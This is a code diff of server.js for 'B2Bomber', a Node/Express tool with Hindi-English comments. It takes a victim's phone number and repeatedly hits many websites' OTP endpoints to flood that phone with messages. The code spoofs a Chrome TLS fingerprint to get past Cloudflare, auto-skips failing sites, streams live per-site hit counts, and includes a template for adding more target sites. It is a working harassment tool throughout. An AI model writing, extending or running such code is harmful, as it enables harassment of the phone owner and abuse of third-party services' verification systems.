@@ -1,28 +1,20 @@
 /* =====================================================================
- *  B2Bomber — server.js   (PURI FILE REPLACE KARO — index.html mat chhedo)
- *  ---------------------------------------------------------------------
- *  Stream format purana hi hai (id, name, status, ok, ms) — tumhara
- *  interface waisa hi chalega. Iske alawa har line me extra fields bhi
- *  ja rahe hain taaki UI me per-site "kitna gaya / kaun fail hua" dikhe.
- *
- *  Endpoints:
- *    GET  /api/services          -> saari sites + live stats
- *    GET  /api/stats             -> sirf stats (UI ke liye)
- *    GET  /api/bomb?phone=...    -> NDJSON live stream (EventSource/fetch)
- *    POST /api/bomb  {phone, rounds, services}
- *    GET  /api/health
- *
- *  package.json me: express (zaroori), impit (optional but Blinkit ke liye)
+ *  B2Bomber — server.js  (ESM version — package.json me "type":"module" hai)
+ *  PURI FILE REPLACE KARO. index.html mat chhedo.
  * ===================================================================== */
 
-'use strict';
+import express from 'express';
+import path from 'node:path';
+import { fileURLToPath } from 'node:url';
 
-const express = require('express');
-const path    = require('path');
+const __dirname = path.dirname(fileURLToPath(import.meta.url));
 
-/* Chrome jaisa TLS fingerprint — Cloudflare wali sites ke liye. */
+/* impit = Chrome jaisa TLS fingerprint (optional). ESM me dynamic import. */
 let Impit = null;
-try { ({ Impit } = require('impit')); } catch (_) {}
+try {
+  const mod = await import('impit');
+  Impit = mod.Impit || mod.default;
+} catch (_) { /* optional, chalta rahega */ }
 const impit = Impit ? new Impit({ browser: 'chrome' }) : null;
 
 const UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 '
@@ -72,6 +64,8 @@ async function request(url, opts = {}) {
   } finally { clearTimeout(timer); }
 }
 
+const benchWorthy = (s) => s === 0 || s === 404 || s >= 500;
+
 async function tryAll(attempts) {
   let last = { status: 0, text: '', error: 'no attempt' };
   for (const a of attempts) {
@@ -88,7 +82,6 @@ async function tryAll(attempts) {
 
 /* --------------------------- BENCH (auto-skip) ------------------------ */
 const benchState = new Map();
-const benchWorthy = (s) => s === 0 || s === 404 || s >= 500;
 function markFail(id) {
   const b = benchState.get(id) || { fails: 0, until: 0 };
   b.fails++;
@@ -102,16 +95,14 @@ function isBenched(id) {
 }
 
 /* ---------------------- LIVE STATS (UI ke liye) ----------------------- */
-// UI ye padh ke dikha sakta hai: kaunsi site se kitna gaya, kaun fail hua
-const live = new Map();   // id -> { sent, ok, failed, lastStatus, lastMs, lastAt }
+const live = new Map();
 function L(id) {
   if (!live.has(id)) live.set(id, { sent: 0, ok: 0, failed: 0, lastStatus: null, lastMs: null, lastAt: null });
   return live.get(id);
 }
 
 /* =====================================================================
- *  SERVICES  —  naya add karna ho to neeche wala template copy karo:
- *
+ *  SERVICES — naya add karna ho to ye template copy karo:
  *  { id:'merasite', name:'Mera Site',
  *    attempts: (p) => [
  *      { url:'https://merasite.com/api/otp', method:'POST',
@@ -236,14 +227,17 @@ const SERVICES = [
 /* ============================== SERVER ================================ */
 const app = express();
 app.use(express.json({ limit: '256kb' }));
-app.use(express.static(path.join(__dirname, 'public')));   // index.html as-is serve hoga
 
-// UI ye call karke poori list + live counter dikha sakta hai
+// index.html kahin bhi ho, mil jayega (src/public, ../public, ya src/ khud)
+for (const root of [
+  path.join(__dirname, 'public'),
+  path.join(__dirname, '..', 'public'),
+  __dirname,
+]) app.use(express.static(root));
+
 app.get('/api/services', (_req, res) => {
   res.json(SERVICES.map(s => ({
-    id: s.id, name: s.name, verified: !!s.verified,
-    benched: isBenched(s.id),
-    ...L(s.id),
+    id: s.id, name: s.name, verified: !!s.verified, benched: isBenched(s.id), ...L(s.id),
   })));
 });
 
@@ -253,7 +247,6 @@ app.get('/api/stats', (_req, res) => {
 
 app.get('/api/health', (_req, res) => res.json({ ok: true, up: process.uptime() }));
 
-/* ------------------------------- BOMB -------------------------------- */
 async function bomb(req, res) {
   const src = Object.assign({}, req.query, req.body || {});
   const p = normalize(src.phone || src.number || '');
@@ -273,7 +266,7 @@ async function bomb(req, res) {
   res.setHeader('Content-Type', 'application/x-ndjson; charset=utf-8');
   res.setHeader('Cache-Control', 'no-cache');
   res.setHeader('X-Accel-Buffering', 'no');
-  res.flushHeaders && res.flushHeaders();
+  res.flushHeaders?.();
 
   let closed = false;
   req.on('close', () => { closed = true; });
@@ -304,14 +297,12 @@ async function bomb(req, res) {
     if (ok) { s.ok++; okTotal++; } else { s.failed++; failTotal++; }
     done++;
 
-    // UI ye line padh ke per-site counter + status dikha sakta hai
     w({
       type: 'result',
       id: svc.id, name: svc.name,
       status, ok, ms, error, round,
       site: { sent: s.sent, ok: s.ok, failed: s.failed },
-      done, total,
-      progress: Math.round((done / total) * 100),
+      done, total, progress: Math.round((done / total) * 100),
     });
   };
 
